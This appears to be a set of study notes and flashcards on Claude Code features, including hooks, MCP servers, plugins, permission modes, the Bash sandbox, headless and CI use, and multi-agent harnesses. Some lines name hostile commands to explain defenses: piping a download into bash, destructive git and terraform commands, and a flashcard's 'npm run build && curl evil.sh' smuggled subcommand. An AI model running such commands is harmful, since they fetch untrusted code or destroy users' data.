Background sessions move into their own worktree before editing. Each session draws on your quota independently.

• Agent teams are experimental and off by default; enable with CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1. A lead session spawns teammates that share a task list and message each other directly. The docs suggest starting with 3 to 5 teammates, and the costs page says teams use about 7x the tokens of a standard session when teammates run in plan mode.
  • Dynamic workflows are a JavaScript script Claude writes, run in the background by a runtime. Ask for one in a prompt (or include the keyword ultracode), watch with /workflows, and save a run as a reusable command in .claude/workflows/. Limits: up to 16 concurrent agents by default and 1,000 agents per run. /deep-research is the bundled example.
  • Cross-session messaging lets your own sessions pass findings to each other (macOS and Linux, per the Week 32 digest).

Trap: Two parallel agents editing the same files. Agent teams docs warn this causes overwrites; give each worker its own files or its own worktree.
Trap: Forgetting that a worktree is a fresh checkout. Dependencies, .env files and build artifacts are missing until you install them or list them in .worktreeinclude.
Trap: Launching a large workflow without a pilot. The workflows page recommends a small slice first; a Large workflow warning appears past 25 agents or 1.5 million projected tokens.
Synthesis: Choose by who holds the plan: you (separate worktree sessions), Claude turn by turn (subagents, teams), or a script (workflows). Move the plan into code once the same fan-out pattern repeats.

cards.q: Where does claude --worktree feature-auth create the worktree, and on what branch?
cards.a: Under .claude/worktrees/feature-auth/ at the repo root, on a new branch named worktree-feature-auth.

cards.q: Which file copies gitignored files like .env into new worktrees?
cards.a: .worktreeinclude at the project root, using .gitignore syntax.

cards.q: How do you enable agent teams?
cards.a: Set CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1 in the environment or in the env block of settings.json; they are experimental and off by default.

cards.q: Which command opens the screen that lists all your background Claude Code sessions?
cards.a: claude agents (agent view, a research preview).

cards.q: In a dynamic workflow, who decides what runs next?
cards.a: The script Claude wrote, executed by the workflow runtime; intermediate results live in script variables instead of Claude's context.

concepts.s: Hooks are handlers Claude Code itself runs at lifecycle events, which makes them the deterministic layer for formatting, logging, notifications and policy enforcement.

x.b:
The hooks guide says hooks give deterministic control: certain actions always happen instead of relying on the model to choose them. You add a hooks block to a settings file; all matching hooks for an event run in parallel. Key events include SessionStart, UserPromptSubmit, PreToolUse (can block), PermissionRequest, PostToolUse, Notification, SubagentStop, Stop, PreCompact, PostCompact, InstructionsLoaded, ConfigChange, WorktreeCreate and SessionEnd.

Handler types: command (shell), http (POST the event JSON), mcp_tool, prompt (single-turn model judgment) and agent (multi-turn verifier with tools; experimental).

x.t: Config example: format after every edit
x.b:
{
  "hooks": {
    "PostToolUse": [
      {
        "matcher": "Edit|Write",
        "hooks": [
          { "type": "command",
            "command": "jq -r '.tool_input.file_path' | xargs npx prettier --write" }
        ]
      }
    ]
  }
}

Hooks read event JSON on stdin and answer through exit codes and stdout. In the guide's protect-files example, a PreToolUse script exits with code 2 to block an edit and its stderr is fed back to Claude. For PreToolUse decisions the most restrictive answer wins, in the order deny, defer, ask, allow.

• The guide says PreToolUse hooks fire before any permission-mode check, so a hook returning deny blocks the tool even in bypassPermissions. A hook returning allow cannot override deny rules from settings.
  • A Stop hook of type prompt or agent can keep Claude working until a condition holds; /goal is built on a session-scoped prompt Stop hook.
  • A SessionStart hook with the compact matcher re-injects context after compaction.
  • The costs page shows a PreToolUse hook rewriting test commands to emit only failures, cutting context from thousands of tokens to hundreds.
  • Default timeouts: 10 minutes for command, http and mcp_tool hooks (lower for some events), 30 seconds for prompt, 60 seconds for agent. /hooks lists what is configured.

Trap: Expecting PostToolUse to undo something. The tool has already executed; block in PreToolUse instead.
Trap: Relying on one hook's deny to stop a sibling hook's side effect. All matching hooks run to completion before results merge.
Trap: Two hooks rewriting the same tool input with updatedInput. They run in parallel and the last to finish wins, which is non-deterministic.
Trap: Assuming a Stop hook means task complete. It fires whenever Claude finishes responding, not on user interrupts.

cards.q: Which hook event can block a tool call before it runs?
cards.a: PreToolUse.

cards.q: What exit code makes a command hook block the action and feed stderr back to Claude?
cards.a: Exit code 2.

cards.q: Can a PreToolUse hook block a tool in bypassPermissions mode?
cards.a: Yes. PreToolUse hooks run before the permission-mode check, so a deny holds even with --dangerously-skip-permissions.

cards.q: Which hook type asks a model to judge a condition in a single turn?
cards.a: type: "prompt", which returns {"ok": true} or {"ok": false, "reason": ...}.

cards.q: Which command shows the hooks Claude Code has loaded?
cards.a: /hooks.

concepts.s: MCP (Model Context Protocol) servers give Claude tools and data from external systems, configured at local, project or user scope, with tool schemas deferred until Claude needs them.

x.b:
The MCP docs show two main transports:

# remote HTTP server (recommended for remote)
claude mcp add --transport http notion <server-url>

# local stdio server; -- separates Claude's options from the server command
claude mcp add --env AIRTABLE_API_KEY=KEY --transport stdio airtable \
  -- npx -y airtable-mcp-server

SSE is deprecated. /mcp shows server status, handles OAuth sign-in and toggles or reconnects servers; claude mcp login <name> authenticates from the shell.

• Local (default): this project only, stored in ~/.claude.json.
  • Project (--scope project): .mcp.json at the repo root, shareable via git. Interactive sessions ask for approval before using these servers; claude mcp reset-project-choices resets the choices.
  • User: all your projects, stored in ~/.claude.json.

When a server is defined in several places, Claude Code uses the single highest-precedence definition without merging fields: local, then project, then user, then plugin-provided, then claude.ai connectors.

• Tool search is on by default: only tool names and server instructions enter context; full schemas load on demand.
  • Claude Code warns when a tool result exceeds 10,000 tokens; the default cap is 25,000 tokens, adjustable with MAX_MCP_OUTPUT_TOKENS.
  • Permission rules use mcp__<server>__* for every tool on a server or mcp__<server>__<tool> for one.

The features overview frames the split this way: MCP gives Claude purpose-built tools for an external system, and a skill teaches Claude how to use those tools well (for example a schema and query patterns for a database MCP).

Trap: Assuming project servers always ask first. In claude -p, the Agent SDK and cloud sessions no prompt can show, so .mcp.json servers load without asking; exclude them with --strict-mcp-config, disabledMcpjsonServers or setting sources.
Trap: Wrapping a CLI that already exists. The costs page says tools like gh, aws and gcloud are still more context-efficient than MCP servers because they add no per-tool listing.
Trap: Expecting fields to merge across scopes. The highest-precedence definition wins whole.
Synthesis: Reach for MCP when the system has no good CLI, needs OAuth, or you want the same integration on every surface including cloud sessions. Pair each important server with a skill that encodes how your team uses it.

cards.q: Where is a project-scoped MCP server stored?
cards.a: In .mcp.json at the project root, which you can commit to share.

cards.q: What is the default MCP scope for claude mcp add, and where is it stored?
cards.a: Local scope, stored in ~/.claude.json and active only for the current project.

cards.q: What is the default MCP tool output limit and how do you change it?
cards.a: 25,000 tokens; set MAX_MCP_OUTPUT_TOKENS to raise it. A warning appears above 10,000 tokens.

cards.q: What does the -- do in claude mcp add ... -- npx server?
cards.a: It separates Claude Code's own options from the server's command and arguments.

cards.q: Write a permission rule matching every tool on an MCP server named github.
cards.a: mcp__github__* (the bare mcp__github form also matches).

concepts.s: A plugin bundles skills, subagents, hooks and MCP servers into one installable, versioned unit, and a marketplace is a catalog file that lists plugins and where to fetch them.

x.b:
The plugins overview defines a plugin as a directory of components with a manifest at .claude-plugin/plugin.json. Components include skills (skills/<name>/SKILL.md, run as /my-plugin:review), agents (agents/), hooks (hooks/hooks.json), MCP servers (.mcp.json), output styles and a JavaScript hooks module (a plugin with one is called a mod).

A marketplace is a repo or directory with .claude-plugin/marketplace.json. You add it once, then install by name, such as commit-commands@claude-plugins-official. Claude Code adds Anthropic's official marketplace on your first interactive session unless policy blocks it. Run /plugin and use the Discover tab; disable with /plugin or claude plugin disable.

• User: every project on this computer. Project: enabled for everyone via committed .claude/settings.json (each person still installs it). Local: you, this repo only.
  • A user-scope install in the terminal also appears in the desktop app's local sessions and VS Code, because they read the same settings files. Cloud sessions do not load your local plugins.
  • During development, load straight from a folder with --plugin-dir (it also accepts .zip, per the Week 19 digest).
  • claude plugin eval scores a plugin against test cases versus a no-plugin baseline (Week 37 digest).

• The overview says an enabled plugin is part of every session: each model-invocable skill, agent and command adds its name and description to context on every turn, its MCP servers run, and its hooks fire. Official-marketplace plugins show a Context cost estimate before install.
  • Plugins run code with your user privileges in any tier (official, community, third-party).
  • Managed settings can allowlist or block marketplaces and force-install plugins across an org.

Trap: Installing many plugins "just in case". Their descriptions cost context on every turn even when unused; check the Installed tab's Not used recently group.
Trap: Confusing a Claude Code plugin with the VS Code extension or JetBrains plugin. Those are IDE integrations, not plugins.
Synthesis: The features overview's trigger list is a good maturity ladder: CLAUDE.md first, skills when you repeat a prompt, hooks when something must always happen, and a plugin only when a second repository needs the same setup.

cards.q: Where does a plugin's manifest live?
cards.a: .claude-plugin/plugin.json inside the plugin directory.

cards.q: What file defines a plugin marketplace?
cards.a: .claude-plugin/marketplace.json in a repository or directory.

cards.q: How do you load a plugin you are developing without a marketplace?
cards.a: Start Claude Code with --plugin-dir pointing at the plugin folder (or a .zip).

cards.q: Why can an unused plugin still cost tokens?
cards.a: The names and descriptions of its model-invocable skills, agents and commands sit in context on every turn while it is enabled.

concepts.s: A permission mode sets which actions run without asking, from Manual (default) through acceptEdits, plan, auto, dontAsk and bypassPermissions, and you cycle the interactive ones with Shift+Tab.

x.b:
From the permission modes page:

  • default (shown as Manual): only reads run without asking.
  • acceptEdits: reads, file edits and common filesystem commands (mkdir, touch, mv, cp).
  • plan: reads, plus classifier-approved commands when auto mode is available; no source edits.
  • auto: everything, with a background classifier blocking risky actions.
  • dontAsk: pre-approved tools only; anything that would prompt is denied. For locked-down CI.
  • bypassPermissions (--dangerously-skip-permissions): everything; isolated containers and VMs only.

Deny rules apply in every mode, including bypass.

A separate classifier model reviews actions before they run and blocks anything that escalates beyond your request, targets unrecognized infrastructure or looks driven by hostile content. Examples blocked by default: curl | bash, production deploys, force pushes, git reset --hard, terraform destroy, sending secrets out. Three blocks in a row or 20 total pause auto mode and return to prompting. Explicit ask rules still force a prompt.

Starting mode: with v2.1.283 or later the built-in default is auto for interactive terminal and VS Code sessions, while claude -p and the Agent SDK default to Manual. permissions.defaultMode overrides it, but auto and bypassPermissions are ignored in project-level settings files.

• Writes to protected paths (.git, .vscode, .idea, .husky, .devcontainer, most of .claude, shell rc files, .npmrc, .mcp.json, .claude.json) are never auto-approved outside bypass mode.
  • rm and rmdir on critical targets (root, home, top-level dirs, the working directory) are blocked even in bypass; the docs call this best-effort, not a sandbox.
  • Bypass refuses to start as root or under sudo unless a recognized sandbox is detected; admins can disable it with permissions.disableBypassPermissionsMode: "disable".

Trap: Treating auto mode as a guarantee. The docs state it reduces prompts but does not guarantee safety; pair it with deny rules and the sandbox.
Trap: Committing defaultMode: "auto" or "bypassPermissions" to the repo's .claude/settings.json and expecting teammates to get it. Those values are ignored in project and local settings.
Trap: Running a scheduled claude -p job and wondering why tools are denied. Non-interactive runs default to Manual; pass --permission-mode or --allowedTools.

cards.q: Which permission mode denies anything not pre-approved instead of prompting?
cards.a: dontAsk.

cards.q: What does acceptEdits auto-approve beyond file edits?
cards.a: Common filesystem commands such as mkdir, touch, mv and cp.

cards.q: Do deny rules apply in bypassPermissions mode?
cards.a: Yes. Deny rules block in every mode, including bypassPermissions.

cards.q: What pauses auto mode and returns to prompting?
cards.a: Three classifier blocks in a row, or 20 blocks in total.

cards.q: What permission mode does claude -p start in when nothing sets one?
cards.a: Manual (default); auto is the built-in default only for interactive terminal and VS Code sessions on v2.1.283 or later.

concepts.n: Permission rules and the settings hierarchy
concepts.s: Allow, ask and deny rules in layered settings files decide what each tool may do, with deny always winning and managed settings sitting above everything a developer can change.

x.b:
The permissions page: rules are Tool or Tool(specifier), evaluated deny, then ask, then allow; the first match wins and specificity does not change the order.

{
  "permissions": {
    "allow": ["Bash(npm run *)", "Bash(git commit *)"],
    "ask":   ["Bash(git push *)"],
    "deny":  ["Read(./.env)", "Read(./.env.*)", "WebFetch"]
  }
}
  • Put * after the subcommand: Bash(git log *) allows only git log; Bash(git *) allows all git.
  • Shell operators are parsed: Bash(safe-cmd *) does not approve safe-cmd && other-cmd; deny and ask rules match any subcommand.
  • Paths use gitignore syntax: //path is filesystem-absolute, ~/path is home, /path is relative to the settings source, ./path or bare is relative to cwd.
  • A bare deny such as Bash removes the tool from Claude's context entirely.
  • Other forms: WebFetch(domain:example.com), mcp__server__tool, Agent(Explore), Skill(deploy *).

The settings page lists, highest first: managed (managed-settings.json, MDM, or server-managed from the claude.ai console), command line (--settings), project local .claude/settings.local.json, shared project .claude/settings.json, user ~/.claude/settings.json. List keys such as permissions.allow merge across files instead of overriding. A deny at any level cannot be allowed by another level.

~/.claude.json is a separate file Claude Code writes itself for account details, MCP servers and per-project trust. Run /status to see which sources loaded and claude doctor to see rejected entries. Settings reload on save, so permissions and hooks edits apply mid-session.

• allowManagedPermissionRulesOnly makes managed settings the only source of permission rules.
  • Committed permissions.allow rules and most env values wait until each teammate trusts the folder; deny and ask rules apply immediately.
  • The HIPAA setup page (Enterprise with a BAA) suggests managed keys forceLoginMethod: "claudeai", forceLoginOrgUUID, allowedProviders: ["anthropic"] and cleanupPeriodDays, requires v2.1.285 or later, and lists features turned off under that configuration: WebFetch, cloud sessions, Remote Control, feedback submission and artifact publishing.

Trap: Writing Read(/Users/me/secrets/**) expecting an absolute path. A single leading slash anchors at the settings source; use //Users/me/secrets/**.
Trap: Trying to carve an allow exception out of a broad deny. Bash(aws *) in deny blocks Bash(aws s3 ls) even if it is allowed.
Trap: Expecting CLAUDE.md to restrict tools. The docs note permission rules are enforced by Claude Code, not the model; prompts only shape what Claude tries.
Trap: A // comment or trailing comma in settings.json. Settings files are strict JSON and the file is reported as a Settings Error.

cards.q: In what order are permission rules evaluated?
cards.a: Deny, then ask, then allow; the first match wins regardless of specificity.

cards.q: Rank the settings sources from highest to lowest precedence.
cards.a: Managed, command line (--settings), .claude/settings.local.json, .claude/settings.json, ~/.claude/settings.json.

cards.q: How do you write an absolute path in a Read or Edit rule?
cards.a: Start it with two slashes, for example Read(//Users/alice/secrets/**).

cards.q: Does Bash(npm run *) approve npm run build && curl evil.sh?
cards.a: No. Each subcommand must match an allow rule independently.

cards.q: What happens when the same list key, like permissions.allow, appears in user and project settings?
cards.a: The lists merge, so both files' entries apply.

concepts.s: The Bash sandbox is an operating-system boundary around shell commands that limits which files they can write and which hosts they can reach, so sandboxed commands can run without per-command approval.

x.b:
The sandboxing page says the sandbox is off by default; turn it on with /sandbox or sandbox.enabled: true. It uses Seatbelt on macOS and bubblewrap plus socat on Linux and WSL2; native Windows runs commands unsandboxed. It is built on the open-source @anthropic-ai/sandbox-runtime package.

  • Writes: working directory, a per-user temp dir and added directories; protected paths stay write-denied.
  • Reads: most of the machine by default, including ~/.ssh and ~/.aws/credentials, unless you add denyRead.
  • Network: no direct route out; a local proxy checks each host against network.allowedDomains, which starts empty.
  • Scope: Bash, PowerShell and Monitor commands and their children. Read, Edit, WebFetch, MCP servers and hooks run outside it and follow permission rules instead.

{
  "sandbox": {
    "enabled": true,
    "allowUnsandboxedCommands": false,
    "filesystem": {
      "allowWrite": ["~/.kube", "/tmp/build"],
      "denyRead": ["~/"],
      "allowRead": ["."]
    }
  }
}

Place the read rules in project settings: . resolves to the project root there, but to ~/.claude in user settings. Sandbox paths use normal conventions (/tmp absolute, ~ home), unlike permission rules' // form.

• Auto-allow: commands that run inside the sandbox are approved without a prompt. Deny rules, content-scoped ask rules like Bash(git push *), and critical-path rm still apply.
  • Regular permissions mode: sandboxed commands still go through the normal prompt flow.
  • When a command fails in the sandbox, Claude may retry with dangerouslyDisableSandbox. Set allowUnsandboxedCommands: false (shown as Strict sandbox mode) to remove that retry, and failIfUnavailable to refuse unsandboxed runs when the sandbox cannot start.
  • excludedCommands runs listed tools fully outside the sandbox; the docs prefer allowWrite or allowedDomains when a tool needs just one more path or host.

Trap: Assuming the sandbox protects secrets from reads. Default reads include credential files; add denyRead or the credentials options.
Trap: Assuming allowedDomains limits WebFetch. It only governs sandboxed shell traffic; WebFetch follows permission rules.
Synthesis: Use permissions to decide what Claude may attempt and the sandbox to cap the blast radius if a prompt injection gets past that decision. The permissions docs describe the two as complementary layers; for full isolation of MCP servers and hooks too, run Claude Code itself in a container or VM.

cards.q: Which OS mechanism does the Claude Code sandbox use on macOS, and what on Linux?
cards.a: Seatbelt on macOS; bubblewrap plus socat on Linux and WSL2.

cards.q: Is the sandbox on by default?
cards.a: No. Enable it with /sandbox or sandbox.enabled: true.

cards.q: Which tools does the sandbox cover?
cards.a: Bash, PowerShell and Monitor commands and their child processes; file tools, WebFetch, MCP servers and hooks run outside it.

cards.q: How do you stop Claude from retrying a failed command outside the sandbox?
cards.a: Set sandbox.allowUnsandboxedCommands to false (Strict sandbox mode).

cards.q: What hosts can sandboxed commands reach by default?
cards.a: None. network.allowedDomains starts empty and a local proxy checks each host.

concepts.s: claude -p runs the full agent loop non-interactively for scripts and CI, with text, JSON or streamed JSON output, schema-validated results and explicit tool and permission flags.

x.b:
The headless page says -p (or --print) runs any claude command non-interactively and reads stdin, so it pipes like a Unix tool. Exit code 0 means success; a SIGTERM exits 143 and leaves the turn unfinished. Piped stdin is capped at 10MB.

cat build-error.txt | claude -p "concisely explain the root cause" > output.txt

claude -p "Find and fix the bug in auth.py" --allowedTools "Read,Edit,Bash"

claude --bare -p "Summarize README.md" --allowedTools "Read"

• --output-format text (default), json (result, session_id, metadata, total_cost_usd) or stream-json (newline-delimited events; add --verbose --include-partial-messages for tokens).
  • --json-schema '<schema>' with --output-format json puts validated output in structured_output; check that the field exists before using it.
  • The system/init event reports plugin_errors and mcp_server_errors, which a CI gate can fail on.
  • Multi-step: --continue for the latest conversation, or capture session_id and pass --resume.

--bare skips auto-discovery of hooks, skills, commands, subagents, plugins, MCP servers, auto memory and CLAUDE.md, so every machine gets the same result. It never reads OAuth or the keychain, so set ANTHROPIC_API_KEY. The docs call it the recommended mode for scripted and SDK calls and say it will become the default for -p in a future release.

  • --allowedTools uses permission rule syntax, e.g. "Bash(git diff *),Bash(git commit *)".
  • --permission-mode sets a baseline (acceptEdits, auto, dontAsk).
  • --permission-prompts none (v2.1.259 or later) denies anything that would wait for a human and tells Claude not to retry.
  • --append-system-prompt adds instructions; --system-prompt replaces the default.

Trap: Running -p without --bare in an untrusted checkout. Without it, a -p session runs the repo's .claude/settings.json hooks and connects .mcp.json servers with no trust dialog.
Trap: Writing Bash(git diff*) without a space. It also matches git diff-index; the space before * is what makes it a word-boundary prefix.
Trap: Expecting --bg with -p. Claude Code rejects the combination.

cards.q: Which flag makes a claude -p run skip local hooks, plugins, MCP servers and CLAUDE.md?
cards.a: --bare.

cards.q: Where does schema-validated output appear when you pass --json-schema?
cards.a: In the structured_output field of the --output-format json response.

cards.q: How do you continue a specific earlier headless conversation?
cards.a: Capture session_id from --output-format json, then run claude -p "..." --resume <session_id>.

cards.q: What are the three --output-format values?
cards.a: text (default), json and stream-json.

cards.q: Which flag denies every permission request that would wait for a human in an unattended run?
cards.a: --permission-prompts none (v2.1.259 or later).

concepts.n: GitHub Actions, CI and scheduled automation
concepts.s: The claude-code-action runs Claude Code inside GitHub workflows on @claude mentions or any event, and scheduled tasks, /loop and /goal keep Claude working on a clock or toward a condition.

x.b:
The GitHub Actions page: run /install-github-app in Claude Code (github.com repos only; needs gh and repo admin) to install the Claude GitHub App, store a secret and open a workflow PR. The secret is ANTHROPIC_API_KEY for an API key or CLAUDE_CODE_OAUTH_TOKEN for a subscription token from claude setup-token.

  • Interactive mode: no prompt input; Claude responds to the trigger phrase (@claude by default) in issues and PRs.
  • Automation mode: a prompt input (plain text or a /skill) runs on any event, including cron.
  • claude_args passes any CLI flag, e.g. --max-turns, --model, --allowedTools, --mcp-config.
- uses: anthropics/claude-code-action@v1
  with:
    anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
    prompt: "Generate a summary of yesterday's commits and open issues"
    claude_args: |
      --allowedTools "mcp__github__list_commits,mcp__github__list_issues"

• Upgrading from @beta: switch to @v1, drop mode, rename direct_prompt to prompt, move CLI options into claude_args.
  • Org rollouts: the docs prefer a Console API key over an OAuth token for shared secrets, or workload identity federation (OIDC) to avoid a long-lived secret.
  • Only users with write access trigger runs by default, and bot actors are rejected unless listed in allowed_bots.
  • Commits pushed with the default GITHUB_TOKEN do not trigger other workflows; let the action authenticate as the Claude GitHub App.
  • Cost controls named in the docs: concise CLAUDE.md, --max-turns, workflow timeouts and concurrency limits. GitLab CI/CD and a managed Code Review product are separate options.

• /loop: /loop 5m check the deploy reruns a prompt in the open session; omit the interval and Claude picks one each iteration. Session-scoped, minimum 1 minute, up to 50 tasks, recurring tasks expire after 7 days.
  • Cloud scheduled tasks (formerly routines, research preview): a saved prompt plus repos and connectors that runs on Anthropic's cloud on a schedule (minimum 1 hour), an API call or GitHub events. Create with /schedule or at claude.ai/code. Desktop scheduled tasks run on your machine with local file access.
  • /goal: /goal all tests in test/auth pass and lint is clean keeps starting turns until a small fast model judges the condition met or impossible. Condition up to 4,000 characters; /goal clear stops it; works with -p.

Trap: Committing an API key in a workflow file. Store it as a GitHub secret and reference it.
Trap: Writing a /goal condition the evaluator cannot see. The goal docs say it judges only what Claude surfaced in the conversation and runs no commands itself, so state the proof, for example "npm test exits 0".
Trap: Relying on /loop for durable jobs. It stops when the session closes; use cloud or desktop scheduled tasks or a cron-triggered Action.

cards.q: Which command sets up the Claude GitHub App, secret and workflow from inside Claude Code?
cards.a: /install-github-app.

cards.q: What decides whether claude-code-action runs in interactive or automation mode?
cards.a: Whether the workflow provides a prompt input; without one it waits for the @claude trigger phrase.

cards.q: Which two secret names does the action accept for authentication?
cards.a: ANTHROPIC_API_KEY for an API key, or CLAUDE_CODE_OAUTH_TOKEN for a subscription token created with claude setup-token.

cards.q: When do recurring /loop tasks expire?
cards.a: Seven days after creation; they fire one last time and delete themselves.

cards.q: How does /goal decide the work is done?
cards.a: After each turn a small fast model checks the condition against the conversation and returns not yet met, met or impossible.

concepts.s: The Claude Agent SDK packages Claude Code's agent loop, tools, permissions, hooks, subagents and sessions as a Python or TypeScript library you embed in your own application.

x.b:
The SDK overview says it gives you the same tools, agent loop and context management that power Claude Code. Install claude-agent-sdk (Python 3.10+) or @anthropic-ai/claude-agent-sdk (Node 18+); both bundle a native Claude Code binary. query() returns an async iterator of messages as Claude thinks, calls tools and finishes.

import asyncio
from claude_agent_sdk import query, ClaudeAgentOptions

async def main():
    async for message in query(
        prompt="Review utils.py for bugs that would cause crashes. Fix them.",
        options=ClaudeAgentOptions(
            allowed_tools=["Read", "Edit", "Glob"],
            permission_mode="acceptEdits",
        ),
    ):
        print(message)

asyncio.run(main())

• Built-in tools, hooks (as callbacks), subagents, MCP (including in-process custom tools), permissions with a canUseTool approval callback, sessions that resume or fork, structured outputs, cost tracking and OpenTelemetry.

concepts.s: Running several agents at once multiplies throughput only when tasks are independent, isolated in separate checkouts, and sized so your review capacity keeps up.

  • Willison (October 2025) runs Claude Code and Codex CLI in several terminals, uses fresh checkouts in a temp directory instead of worktrees, and sends riskier asynchronous work to Codex Cloud, often from his phone.
  • Hashimoto blocks the last 30 minutes of each day to start agents on research and triage for a "warm start" next morning, outsources tasks he is confident they will handle, and turns off agent desktop notifications so he controls when to check in. He estimates a background agent runs only 10 to 20% of his workday.

  • For large mechanical changes, Claude Code's /batch splits work across 5 to 30 subagents, each in its own worktree opening its own PR. A script that loops claude -p over a file list does the same with your own control; Anthropic advises refining the prompt on 2 or 3 files before running the full set and scoping tools with --allowedTools.
for file in $(cat files.txt); do
  claude -p "Migrate $file ... Return OK or FAIL." \
    --allowedTools "Edit,Bash(git commit *)"
done

Willison's patterns for low-overhead parallel work:

  • Research prototypes that answer whether libraries work together.
  • Explanations of how an existing system works, saved as reusable context.
  • Small maintenance chores such as deprecation warnings.
  • Carefully specified work where you wrote the spec.
  • Scouting: give an agent a hard task you do not intend to merge, just to see which files it touches.

Synthesis: Review capacity is the binding constraint. Treat agent sessions like work in progress on a kanban board: set a limit equal to the number of results you can review well in a sitting, and start new sessions only when one lands or is abandoned. Abandoning 10 to 20% of sessions, as Cherny reports, is normal and cheaper than rescuing them.

Trap: Two agents editing the same files in one checkout. Use separate worktrees or clones.
Trap: Shared mutable resources such as one dev database, port or cache. Parallel agents collide outside git too.
Trap: More sessions than you can review. Output piles up, context switching rises, and quality drops.
Trap: Unscoped fan-out. A loop over 2,000 files with a bad prompt makes 2,000 bad commits; pilot on a few first.

concepts.n: The Ralph loop and autonomous loops
concepts.s: The Ralph loop, named and popularized by Geoffrey Huntley, runs a coding agent over and over on the same prompt file, relying on on-disk plans, specs and tests for memory and on sheer persistence for progress.

x.b:
Huntley's post "Ralph Wiggum as a 'software engineer'" presents the technique as a single bash loop that pipes the same prompt file into the agent forever:

while :; do cat PROMPT.md | claude-code ; done

Coverage of the technique describes the supporting files: PROMPT.md (instructions fed each iteration), a prioritized fix_plan.md the agent reads and updates, specs/ to build against, and an agent notes file with build and test knowledge. Each iteration does one item and must search the codebase before assuming something is unimplemented.

On the Dev Interrupted podcast (January 2026) Huntley described it as brute force plus persistence, discussed managing context rot, and favored fresh context over compaction.

• Every iteration starts with a clean context window, so there is no accumulated rot.
  • State lives on disk (plan, specs, git), so a stuck iteration costs one loop, not the project.
  • Tests and builds supply backpressure: the loop can only claim progress the checks accept.

Anthropic's C compiler project used the same shape: a bash loop restarted a fresh Claude session in a container whenever one finished.

Synthesis: Product features now cover parts of the pattern: goal conditions and Stop hooks keep a session working until a check passes, and long-running harness posts formalize the progress file. The bare loop remains useful because it is transparent and tool-agnostic.

• Greenfield projects with a clear spec and a strong test suite. Huntley's own framing, his tagline "deterministically bad in an undeterministic world", says the failures are predictable, so you tune the prompt and plan when you see one.
  • Large backlogs of independent, checkable items such as porting or migrations.
  • It fits legacy codebases poorly, where implicit context and weak tests let the loop wander.

Trap: Weak backpressure. Without strong tests the loop happily produces code that compiles and does the wrong thing.
Trap: Repo litter. Reported failure modes include leftover temporary files and binaries; plan cleanup passes and gitignore rules.
Trap: Silent drift. When the loop goes off track the usual fix is a hard reset to a good commit plus a corrected prompt, so commit after every iteration.
Trap: Unbounded spend. An infinite loop on a paid API has no natural stop; cap iterations or budget.

cards.q: What is the Ralph loop in one line?
cards.a: A bash loop that repeatedly pipes the same PROMPT.md into a coding agent, with progress persisted on disk between runs.

cards.q: Why does each Ralph iteration do only one item?
cards.a: To keep the fresh context window focused and avoid filling it with noise, which keeps quality high per iteration.

cards.q: Where does a Ralph loop keep its memory between iterations?
cards.a: On disk: the prompt file, a prioritized fix plan, specs and git history.

cards.q: What kind of codebase suits the Ralph loop worst?
cards.a: Legacy codebases with implicit context and weak tests, where the loop has little backpressure.

concepts.s: Multi-hour and multi-day agent work succeeds when the harness gives each fresh session external memory (feature list, progress log, git history, startup script), a separate evaluator, and, for teams of agents, a simple way to claim independent work.

x.b:
Justin Young's November 2025 Anthropic post "Effective harnesses for long-running agents" splits the job:

  • An initializer agent runs once and writes an init.sh that starts the dev server, a claude-progress.txt log, an initial git commit, and a JSON feature list (over 200 items for a claude.ai clone) with every feature marked failing.
  • A coding agent runs every later session, works on one feature, commits with a descriptive message, and updates the progress file so the next session does not have to guess.

Each session starts with a ritual: check the working directory, read the progress file and feature list, read the git log, run init.sh and a basic end-to-end check, and only then pick the highest-priority unfinished feature.

Rajasekaran's March 2026 follow-up adds three roles. A planner expands a 1 to 4 sentence prompt into a product spec; a generator builds in sprints; an evaluator clicks through the running app with Playwright and fails a sprint if any criterion is below threshold. Before each sprint the generator and evaluator agree a "sprint contract" of what will be built and how it will be checked.

  • A retro game maker took 20 minutes and $9 solo versus 6 hours and $200 with the full harness, with far better results.
  • He defines context anxiety as wrapping up early near the perceived limit. Sonnet 4.5 needed context resets; with Opus 4.5 he dropped resets for automatic compaction, and with Opus 4.6 he removed sprints.

Carlini's February 2026 C compiler post ran 16 Claude agents for nearly 2,000 sessions over about two weeks for just under $20,000, producing a roughly 100,000-line Rust compiler that builds Linux 6.9 on x86, ARM and RISC-V. Coordination was deliberately simple: each agent had its own container and clone, claimed a task by writing a lock file in current_tasks/, and git conflicts prevented double claims. There was no orchestrator agent.

  • When all agents hit the same monolithic problem (compiling the kernel) they collided; using GCC as a known-good oracle for most files let them fix different bugs in parallel.
  • Some agents had standing roles: deduplication, performance, code quality critique, documentation.
  • Limits: new features often broke existing ones, code quality was well below expert, and he judged the project near the model's ceiling.

Claude Code's built-in agent teams are experimental and disabled by default, per Anthropic's best practices page.

Trap: Declaring the project finished early because some features exist. Fix: an explicit feature list with one feature per session.
Trap: Half-finished, undocumented work at the end of a session. Fix: commit and update the progress log before stopping.
Trap: Self-grading. Generators rate their own work too generously; use a separate, tuned evaluator.
Trap: Parallelizing a task that is not decomposable. Agents collide unless you create an oracle or split the work.

• Can a brand-new session learn the project state in under a minute from files alone?
  • Which file is the single source of truth for what is done, and can the agent corrupt it?
  • What does the evaluator check that the generator's own tests do not?
  • Which harness components are still load-bearing on the current model?

cards.a: Each wrote a lock file into current_tasks/ in a shared git repo, and git conflicts rejected duplicate claims.

cards.a: A model wrapping up work prematurely as it approaches what it believes is its context limit.

cards.a: Just under $20,000 over about 2,000 sessions, producing a roughly 100,000-line Rust compiler that builds Linux 6.9.

concepts.s: Teams get compounding returns by versioning agent instructions, skills, commands and hooks in the repository and maintaining them like code, so one engineer's lesson becomes every agent's default.

Include commands the agent cannot guess, non-default style rules, test instructions, repo etiquette, architectural decisions, environment quirks and gotchas. Exclude anything derivable from code, standard conventions, long tutorials and fast-changing information.

  • Skills and commands. Codex stores team skills in .agents/skills; Claude Code uses .claude/skills and .claude/commands; plugins bundle skills, hooks, subagents and MCP servers into one installable unit.
  • Review standards. OpenAI suggests a code_review.md referenced from AGENTS.md.

  • Anthropic: treat the file like code, review it when things go wrong, prune it, and test changes by watching whether behavior shifts. For a checked-in CLAUDE.md, its /doctor command proposes cuts for content derivable from the code.

x.t: Make the repository legible to agents

The same OpenAI write-up describes a five-month internal project that shipped a roughly one-million-line beta with no manually written source code. Trap: Stale commands. An instruction that names a renamed script misleads every agent on the team.

